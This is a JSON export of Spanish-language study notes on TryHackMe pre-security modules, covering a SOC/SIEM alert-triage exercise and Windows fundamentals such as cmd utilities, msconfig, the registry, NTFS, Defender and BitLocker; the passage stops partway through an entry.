    "content": "Escenario:\n>*Eres un analista SOC responsable de proteger un banco. El SOC del banco usa una herramienta SIEM (Security Information and Event Management) la cual recolecta información y eventos relacionados con la seguridad de varias fuentes y las presenta en una dashboard.*\n\n No todas las alertas son maliciosas, queda bajo responsabilidad del analista averiguar cuales son maliciosas. Por ejemplo, alertas por múltiples intentos de inicio de sesión, aunque sospechoso, no siempre es malicioso, pues esto pasa. \n O puede que haya una IP desconocida  intentando conectarse (sospechoso).\n\n1. !![[Pasted image 20250410193612.png]]\n\t1. IP sospechosa: 143.110.250.149\n2. ![[Pasted image 20250410193838.png]]\n3. ![[Pasted image 20250410193908.png]]\n\t1. Herramientas para comprobar IPs maliciosas:\n\t\t1. AbuselPDB\n\t\t2. Cisco Talos Intelligence\n4. ![[Pasted image 20250410194108.png]]\n5. ![[Pasted image 20250410194211.png]]\n6. THM{THREAT-BLOCKED}\n\n"
  },
  {
    "title": "7. Command Prompt",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/7-command-prompt/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/7. Command Prompt.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Continuamos con las herramientas del panel de configuración del sistema.\n\nLa línea de comandos (`cmd`), puede parecer un poco intimidante al principio.\n\nAquí veremos algunos de los comandos que se pueden utilizar:\n\nEmpezaremos con `hostname` y `whoami`.\n\n```PowerShell\nC:\\Users\\Administrator> hostname\nTHM-WINFUN2\n```\n\n```PowerShell\nC:\\Users\\Administrator> whoami\nthm-winfun2\\administrator\n```\n\nAhora veremos comandos útiles en la resolución de problemas:\n\n```PowerShell\nC:\\Users\\Administrator> ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Ethernet:\n\n\tConnection-specific DNS Suffix. . .eu-xxxxxxxxxxxxxxxx.internal\n\tLink-local IPv6 Address . . . . . .fe80::6486:c81a:3db5:a0ed%7\n\tIPv4 Address. . . . . . . . . . . . 10.10.x.x\n\tSubnet Mask . . . . . . . . . . . . 255.255.0.0\n\tDefault Gateway . . . . . . . . . . 10.10.x.x\n```\n\nTodos los comandos tienen un manual de ayuda para explicar la sintaxis esperada del comando, junto con otros parámetros adicionales opcionales. Para ver este manual hay que añadir `/?` al final del comando, por ejemplo: `ipconfig /?`.\n\nPara limpiar la pantalla el comando es `cls`.\n\nEl comando `netstat` nos mostrará estadísticas del protocolo y las conexiones actuales de la red en TCP-IP.\n\nEl comando `net` se utiliza por lo general para controlar los recursos de la red. Para ver ayuda en este comando, `/?` no funcionará. En su lugar hay que usar `help`: `net help`. Si deseas ver ayuda parra el comando `net user`, por ejemplo, el comando sería `net help user`."
  },
  {
    "title": "4. Computer Management",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/4-computer-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/4. Computer Management.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguimos con herramientas disponibles en el panel de configuración del sistema.\n\nLa utilidad del gestor del ordenador (Computer Management) `compmgmt`, tiene tres secciones, primariamente: `System Tools`, `Storage` y `Services and Applications`.\n\n<h2>System Tools</h2>\nEmpezaremos con el organizador de tareas (Task Scheduler). Con él podemos crear y dirigir tareas que nuestro ordenador ejecutará cuando le digamos.\n\nPara crear una tarea le damos a `Crate Basic Task` debajo de `Actions`.\n\nDespués viene el visor de eventos (Event Viewer). Nos permite ver eventos que han ocurrido en el ordenador. Pueden ser entendidos como logs que nos permiten auditar la integridad del sistema.\n\nEl visor de eventos tiene tres partes:\n\n1. La parte de la izquierda nos da un listado jerárquico en árbol de los proveedores de logs de eventos.\n2. El medio nos enseña una vista general y un resumen de los eventos específicos seleccionados.\n3. El lado de la derecha nos muestra las acciones.\n\nHay cinco tipos de eventos que pueden ser registrados:\n\n![[039.png]]\n\nLos logs estándar son visibles debajo de `Windows Logs`:\n\n![[040.png]]\n\nEn `Shared Folders` (carpetas compartidas), verás una lista completa de los archivos y carpetas compartidos a los que otros pueden acceder/conectarse.\n\nLa compartición de Windows por defecto se llama `C$`:\n\n![[041.png]]\n\nDebajo de `Sessions` puedes ver a usuarios que están conectados a los shares. Y todos los archivos a los que accedan se listarán debajo de `Open Files`.\n\nLa sección de usuarios y grupos locales debería sonarte pues la vimos en [[6. User Accounts, Profiles and Permissions]]. Es `lusrmgr.msc`.\n\nEn `Performance` verás una utilidad llamada `Performance Monitor` (`perfmon`). Es usada para ver la información en tiempo real o de un archivo log.\n\n`Device Manager` nos permite ver y configurar el hardware como deshabilitar cualquier parte unida al ordenador.\n\n![[042.png]]\n\n-------------------\n<h2>Storage</h2>\nEn Storage se encuentran `Windows Server Backup` y `Disk Management`.\n\nDisk Management es una utilidad del sistema en Windows que nos permite realizar tareas de almacenaje complejas. Algunas son:\n\n- Montar un nuevo disco.\n- Extender una partición.\n- Reducir una partición.\n- Asignar o cambiar la letra de un disco (por ejemplo `E:`).\n\n![[043.png]]\n\n-------------------\n<h2>Services and Applications</h2>\nUn servicio es un tipo de aplicación especial que corre en el fondo (bg). Aquí a parte de activar o desactivar el servicio, puedes ver sus propiedades.\n\n![[044.png]]\n\nWMI (Windows Management Instrumentation) es el servicio que configura y controla precisamente la instrumentación del Windows Manager.\n\nEn versiones modernas esta `deprecated`. Powershell la ha sustituido."
  },
  {
    "title": "3. Change UAC Settings",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/3-change-uac-settings/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/3. Change UAC Settings.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Vamos a continuar con herramientas disponibles a través del panel de configuración de sistema.\nCubrimos UAC en gran detalle en [[7. User Account Control]]. Estos ajustes (UAC) pueden ser modificados o apagados por completo (aunque no se recomienda).\n\nHabiendo entrado en `msconfig` podemos ejecutar `C:\\Windows\\System32\\UserAc.cou` en la pestaña tools y arrastrar la barra para ver como van cambiando los ajustes del UAC."
  },
  {
    "title": "2. System Configuration",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/2-system-configuration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/2. System Configuration.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "La utilidad de configuración del sistema (`MSConfig`) es para gestión de problemas avanzada y está hecha para diagnosticar problemas de arranque.\n\nPara ejecutar la configuración del sistema necesitas permisos de administrador. Puedes escribir `msconfig` en el menú de inicio.\n\nEsta utilidad tiene 5 pestañas arriba:\n\n1. General: Podemos seleccionar dispositivos y servicios para que Windows los cargue al arrancar.\n2. Boot: Aquí podemos definir varias opciones de arranque para el sistema operativo.\n3. Services: Lista todos los servicios configurados por el sistema independientemente de su estado.\n4. Startup: Windows recomienda usar el gestor de tareas (`taskmgr`) para gestionar los objetos de arranque.\n5. Tools: Hay una lista de varias herramientas que podemos ejecutar para configurar el sistema. Hay una breve descripción de lo que hacen."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "En [[1. Introduction to Windows]] vimos sobre el sistema de ficheros, el control de usuarios, el panel de control y el controlador de tareas.\n\nEn este módulo cubriremos otras utilidades disponibles en Windows."
  },
  {
    "title": "6. Resource Monitor",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/6-resource-monitor/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/6. Resource Monitor.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguimos utilizando herramientas disponibles a través del panel de configuración del sistema.\n\n¿Qué es el monitoreado de recursos (`resmon`)?\n\nEs una herramienta que nos muestra el uso de recursos como CPU, memoria, red, etc. Está diseñada, por lo general, para usuarios avanzados que necesitan solucionar problemas en el sistema o comprobar los recursos consumidos.\n\nEn la pestaña de vista general, Resmon tiene cuatro secciones:\n\n1. CPU.\n2. Disk.\n3. Network.\n4. Memory."
  },
  {
    "title": "5. System Information",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/5-system-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/5. System Information.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguiremos con herramientas disponibles en el panel de configuración del sistema.\n\n¿Qué es la herramienta de información del sistema `msinfo32`?\n\nSe ejecuta con `Msinfo32.exe`. Recolecta información sobre tu ordenador y te la enseña de una manera entendible. El resumen de sistema (System Summary) está dividida en tres secciones:\n\n1. Hardware Resources: No es para el usuario medio. Contiene información técnica.\n2. Components: Aquí puedes ver información específica sobre los dispositivos de hardware instalados.\n3. Software environment: Aquí puedes ver información del software preinstalado y el que hayas instalado tú. Aquí aparecen: `Environment Variables` y `Network Connections`.\n\nEn [[5. The Windows System32 Folders]] tocamos de manera breve las variables de entorno. Al hacer click en `Environment Variables` entramos en el panel. Otra manera de acceder es `Control Panel > System and Security > System > Advanced system settings > Environment Variables` **Ó** `Settings > System > About > system info > Advanced system settings > Environment Variables`.\n\nEn la herramienta `msinfo32` hay una barra de búsqueda en la parte inferior. Ahí puedes buscar cosas como `IP address`."
  },
  {
    "title": "8. Registry Editor",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/8-registry-editor/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/8. Registry Editor.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Continuamos con las herramientas disponibles a través del panel de configuración del sistema.\n\nEl registro de Windows (Windows Registry) es una base de datos central usada para guardar información necesaria para configurar el sistema por uno o más usuarios, aplicaciones y dispositivos de hardware.\n\nContiene información que se referencia constantemente en procesos como:\n\n- Perfiles de cada usuario.\n- Aplicaciones instaladas en el ordenador y los tipos de documentos que cada uno puede crear.\n- Hojas de propiedad de archivos y ficheros.\n- Qué hardware existe en el sistema.\n- Los puertos usados.\n\n>[!WARNING] El registro de Windows no es para usuarios no avanzados y modificarlo puede afectar al correcto desarrollo del sistema operativo.\n\nPara acceder podemos escribir `regedit`.\n\n![[045.png]]"
  },
  {
    "title": "0. Windows Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/0-windows-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/0. Windows Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "[[THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/1. Introduction|1. Introduction]]\n[[2. System Configuration]]\n[[3. Change UAC Settings]]\n[[4. Computer Management]]\n[[5. System Information]]\n[[6. Resource Monitor]]\n[[7. Command Prompt]]\n[[8. Registry Editor]]\n"
  },
  {
    "title": "0. Windows Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/0-windows-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/0. Windows Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "[[1. Introduction to Windows]]\n[[2. Windows Editions]]\n[[3. The Desktop (GUI)]]\n[[4. The File System]]\n[[5. The Windows System32 Folders]]\n[[6. User Accounts, Profiles and Permissions]]\n[[7. User Account Control]]\n[[8. Settings and the Control Panel]]\n[[9. Task Manager]]\n"
  },
  {
    "title": "4. The File System",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/4-the-file-system/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/4. The File System.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema de archivos usado en versiones modernas de Windows es NTFS (New Technology File System). Antes de esto estuvieron FAT16/FAT32 (File Allocation Table) y HPFS (High Performance File System).\n\nTodavía se ven las particiones FAT hoy en día, sobretodo en dispositivos como USB, MicroSD, etc.\n\nNTFS es conocido como un sistema de ficheros \"journaling\". Puede reparar archivos y ficheros del disco en caso de falla usando información que se guarda en el disco. Esta función no es posible con FAT.\n\nNTFS combate muchas de las limitaciones de los sistemas de ficheros previos:\n\n- Soporta archivos mayores que 4 GB.\n- Puede aportar permisos específicos a archivos y ficheros.\n- Compresión de archivos y ficheros.\n- Encriptación (Encryption File System o EFS).\n\n[Aquí](https://docs.microsoft.com/en-us/troubleshoot/windows-client/backup-and-storage/fat-hpfs-and-ntfs-file-systems) puedes encontrar la documentación oficial de Windows de FAT, HPFS y NTFS.\n\nEn volúmenes NTFS puedes establecer permisos que den o denieguen acceso a archivos o ficheros. Estos son:\n\n- Control absoluto.\n- Modificar.\n- Leer y ejecutar.\n- Listar contenidos del fichero.\n- Escribir.\n- Leer.\n\nPara ver permisos de un archivo o fichero:\n\n1. Click derecho en el archivo o fichero.\n2. Seleccionar Propiedades.\n3. Seleccionar la pestaña Seguridad.\n4. En la lista de nombre de usuarios o grupos selecciona aquella persona/grupo del cual quieras ver los permisos.\n\nOtra peculiaridad de NTFS es ADS (Alternate Data Streams). Es un atributo específico de Windows NTFS.\n\nTodos los archivos tienen al menos un data stream ($DATA) y ADS permite a los archivos tener más de uno. Para ver esta información debemos hacer uso de la Powershell.\n\nLos desarrolladores de malware han utilizado históricamente este ADS para esconder información."
  },
  {
    "title": "3. The Desktop (GUI)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/3-the-desktop-gui/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/3. The Desktop (GUI).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "La GUI (Graphical User Interface) es la pantalla que te da la bienvenida al sistema una vez abres tu máquina Windows.\n\nHabitualmente debes pasar la pantalla de inicio de sesión primero. En la imagen de abajo vemos un escritorio de Windows 10.\n\n![[034.png]]\n\n1. Escritorio.\n2. Menú de Inicio.\n3. Barra de búsqueda.\n4. Barra de Tareas.\n5. Barra de Herramientas.\n6. Área de Notificaciones.\n\n<h2>El escritorio</h2>\nEs donde están son atajos a los programas, archivos, ficheros, etc. Al hacer click derecho sobre el escritorio, se despliega una tabla con opciones. En Display Settings, puedes hacer cambios a la resolución y orientación a la pantalla. En caso de tener varias pantallas puedes configurarlas aquí. También puedes cambiar el fondo de pantalla en Personalize.\n\n---------------\n<h2>El menú de inicio</h2>\nOtorga acceso a todas las apps, archivos y demás. Al hacer click en él se desplegará. Este está formado por varias secciones:\n\n![[035.png]]\n\n1. Esta sección nos ofrece atajos rápidos a acciones que podemos realizar con nuestra cuenta.\n2. En esta otra sección vemos un atajo a todos aquellos programas que hayan sido añadidos recientemente.\n3. Aquí se encuentran las tiles (los programas añadidos a esta sección). Al hacer click en ellos, se despliega un menú de opciones. Puedes añadir aplicaciones haciendo click derecho y luego pin.\n\n---------------\n<h2>La barra de tareas</h2>\nAlgunos de los componentes están activados y son visibles por defecto (fijados). Esto es útil porque podemos decidir qué programas fijamos y cuáles no para más eficacia a la hora de trabajar.\n\nPasar por encima del icono nos dará una previsualización de la aplicación. Además si tenemos más de una instancia abierta de la misma aplicación nos mostrará todas con su nombre arriba, lo que es útil para diferenciarlas.\n\nSi cierras programas que no están anclados a la barra de tareas desaparecerán de estas.\n\n------------------\n<h2>El área de notificaciones</h2>\nEstá habitualmente en la parte de abajo a la derecha de la pantalla. Es donde se muestran la fecha y la hora. Otros iconos que se pueden ver son el de la conexión, el volumen, etc.\n\nHaciendo click derecho y después en Taskbar settings puedes editar los iconos que salen en ese área."
  },
  {
    "title": "7. User Account Control",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/7-user-account-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/7. User Account Control.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "La gran mayoría de usuarios domésticos están logueados en sus sistemas como administradores locales. Para el uso doméstico no hace falta, por lo general, tener tantos privilegios. Esto incrementa enormemente el riesgo para los usuarios.\n\nPara proteger al usuario local con estos privilegios, Microsoft introdujoi el UAC (User Account Control). Este concepto fue introducido de la mano de Windows Vista (visto en [[2. Windows Editions]]).\n\nUAC funciona de la siguiente manera. Cuando un usuario con una cuenta de tipo administrador inicia sesión en el sistema, la versión actual no corre con permisos elevados. De tal manera que cuando sea necesario ejecutar altos privilegios, se le pedirá la contraseña al usuario para saber si está de acuerdo con esta acción."
  },
  {
    "title": "2. Windows Editions",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/2-windows-editions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/2. Windows Editions.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema operativo Windows tiene una larga historia, remontándose hasta 1985. Actualmente es el sistema operativo dominante entre usuarios y empresas.\n\nPrimero hubo Windows XP. Cuando se anunció que se dejaría de dar soporte a este mucha gente se asustó y los vendedores de productos tuvieron que ir a contrarreloj para asegurarse de que sus productos funcionaban con Windows 7, el siguiente a XP, puesto que entre medias había habido un intento llamado Windows Vista que no fue nada bien acogido.\n\nPoco después sacaron Windows 8.x, el cuál tuvo el mismo problema que Windows Vista.\n\nDespués de esto vinieron Windows 10 y Windows 11 (el actual).\n\nEn Windows Pro puedes activar la encriptación de BitLocker mientras que en Windows Home no."
  },
  {
    "title": "8. Settings and the Control Panel",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/8-settings-and-the-control-panel/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/8. Settings and the Control Panel.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "En un sistema Windows, las localizaciones principales para hacer cambios son el menú de ajustes y el panel de control.\n\nEl menú de ajustes fue introducido junto con Windows 8 pero sigue disponible a día de hoy. Hay parecidos y diferencias entre los dos:\n\n<h6>Menú de Ajustes:</h6>\n![[037.png]]\n<h6>Panel de Control:</h6>\n![[038.png]]\n\n\nEl panel de control es donde accederás para ajustes más complejos."
  },
  {
    "title": "6. User Accounts, Profiles and Permissions",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/6-user-accounts-profiles-and-permissions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/6. User Accounts, Profiles and Permissions.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "Las cuentas de usuarios pueden ser de dos tipos principalmente: Administrador o Usuario estándar.\n\nEl tipo de cuenta determina qué acciones se pueden llevar a cabo.\n\n- Un administrador puede hacer cambios al sistema: añadir usuarios, eliminarlos, modificar grupos, cambiar ajustes del sistema, etc.\n- Un usuario estándar sólo puede hacer cambios en carpetas o archivos atribuídos a él y no puede hacer modificaciones a nivel de sistema, como instalar programas.\n\nHay varias maneras de ver qué usuarios existen en el sistema. Una manera es hacer click en `Start Menu` y escribir `Other user`. Un atajo de `System Settings > Other users` aparecerá.\n\nCada usuario se localiza en `C:\\Users`. Todos ellos tendrán las mismas carpetas iniciales. Algunas son:\n\n- Desktop\n- Documents\n- Downloads\n- Music\n- Pictures\n\nOtra manera de acceder a esta información es hacer click derecho en el menú de inicio y seleccionar `Run`. Después escribir `lusrmgr.msc`.\n\n![[036.gif]]\n\nAllí deberías ver dos carpetas: **Users** y **Groups**.\n\nSi haces click en grupos, verás los nombres de los grupos locales con una breve descripción de cada uno.\n\nCada uno de estos grupos tiene permisos ya dados por el administrador. Cuando un usuario es asignado a un grupo, adquiere los permisos de ese grupo. Un usuario puede ser asignado a múltiples grupos."
  },
  {
    "title": "9. Task Manager",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/9-task-manager/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/9. Task Manager.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El gestor de tareas nos da información sobre las publicaciones y procesos corriendo en el sistema. Otra información también está disponible como cuánta CPU y RAM están siendo utilizadas.\n\nPuedes acceder haciendo click derecho en la barra de tareas y luego en Task Manager."
  },
  {
    "title": "5. The Windows System32 Folders",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/5-the-windows-system32-folders/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/5. The Windows System32 Folders.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El fichero `C:\\Windows` es tradicionalmente conocido como el fichero que contiene el sistema operativo de Windows. Este fichero no tiene por qué estar en C. Ni siquiera tiene por que estar en el mismo drive.\n\nEs aquí donde entran en juego las variables de entorno. La variable de entorno para el directorio Windows es `%windir%`. \n\nLos ficheros de System32 son críticos para el sistema operativo y muy importantes. El borrado accidental de cualquier fichero ubicado dentro de Windows32 puede dejar inutilizable el sistema operativo."
  },
  {
    "title": "1. Introduction to Windows",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/1-windows-fundamentals-part-1/1-introduction-to-windows/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/1. Introduction to Windows.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 1. Windows Fundamentals Part 1",
    "content": "El sistema operativo Windows es un producto complejo con muchos nombres de archivos, utilidades, ajustes, funcionalidades, etc.\n\nEn este módulo intentaremos otorgar una visión general de un puñado de lo que hace al SO Windows, navegar la interfaz, hacer cambios al sistema y más."
  },
  {
    "title": "6. App and Browser Control",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/6-app-and-browser-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/6. App and Browser Control.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "En esta sección puedes cambiar los ajustes de la Microsoft Defender SmartScreen.\n\nEsta nos protege contra el phising, webs maliciosas o la descarga de archivos infectados.\n\nHay dos secciones principales:\n\n- Comprobar apps y archivos: Ayuda a proteger tu dispositivo comprobando apps no reconocidas y archivos de la web.\n- Protección contra exploits: Está integrada en Windows 10 y ayuda a prevenir ataques.\n\n>[!WARNING] A no ser que sepas al 100% lo que estás haciendo, se recomienda que dejes los ajustes por defecto.\n\n"
  },
  {
    "title": "9. Volume Shadow Copy Service",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/9-volume-shadow-copy-service/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/9. Volume Shadow Copy Service.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "El Volume Shadow Copy Service (VSS) coordina las acciones requeridas para crear una snapshot (una especie de copia de seguridad).\n\nSi VSS está activo (Protección del Sistema encendido), puedes realizar las siguientes tareas:\n\n- Crear un punto de restablecimiento.\n- Realizar un restablecimiento del sistema.\n- Configurar ajustes de restablecimiento.\n- Borrar puntos de restablecimiento.\n\nLos desarrolladores de malware conocen la existencia de estos archivos e incorporan código en sus malwares que buscan y borran estos archivos."
  },
  {
    "title": "4. Virus and Threat Protection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/4-virus-and-threat-protection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/4. Virus and Threat Protection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Se divide en dos partes:\n\n- Peligros actuales.\n- Ajustes de protección contra virus y amenazas.\n\n<h2>Peligros actuales</h2>\nOpciones de escaneo:\n\n- Rápido: Comprueba aquellos ficheros en los que los peligros se suelen alojar.\n- Completo: Comprueba todos los archivos y programas activos en el disco duro.\n- Personalizado: Elije archivos y localizaciones para escanear.\n\nHistorial de amenazas:\n\n- Último escaneo: Windows Defender Antivirus escanea tu dispositivo automáticamente en busca de amenazas o virus.\n- Amenazas en cuarentena: Amenazas que han sido aisladas. Son eliminadas periódicamente.\n- Amenazas permitidas: Son identificados como amenazas pero tú has permitido que se ejecuten.\n\n>[!WARNING] No permitas a un  objeto identificado como amenaza ejecutarse si no sabes lo que haces.\n\n--------------\n<h2>Ajustes de protección contra virus y amenazas</h2>\nControlar ajustes\n\n- Protección en tiempo real: Localiza y previene al malware de instalarse o ejecutarse en tu dispositivo.\n- Protección de nube: Ofrece protección para acceder a la última copia de seguridad en la nube.\n- Subida automática de pruebas: Manda ejemplos de archivos a Microsoft para ayudar a protegerte a ti y a otros.\n- Acceso controlado a ficheros: Protege archivos, ficheros y áreas de memoria de accesos no autorizados.\n- Exclusiones: Windows Defender Antivirus no escaneará archivos excluidos.\n- Notificaciones: WDA mandará notificaciones con información crítica.\n\n>[!WARNING] Los archivos excluidos podrían contener malware. Usa esta opción sólo si sabes lo que haces.\n\nActualizaciones de protección contra virus y amenazas:\n\n- Buscar actualizaciones: Comprueba manualmente si hay alguna actualización que afecte a WDA.\n\nProtección contra ransomware:\n\n- Acceso controlado a ficheros: La protección contra ransomware requiere que esta opción esté habilitada.\n\n>[!TIP] Puedes escanear cualquier archivo o fichero haciendo click derecho y seleccionando `Scan with Microsoft Defender`.\n\n"
  },
  {
    "title": "8. BitLocker",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/8-bitlocker/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/8. BitLocker.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "BitLocker es una funcionalidad de protección de información mediante encriptación. \n\nEs recomendable usar BitLocker con dispositivos con TPM. Este drive removible contiene la llave de arranque (startup key)."
  },
  {
    "title": "3. Windows Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/3-windows-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/3. Windows Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
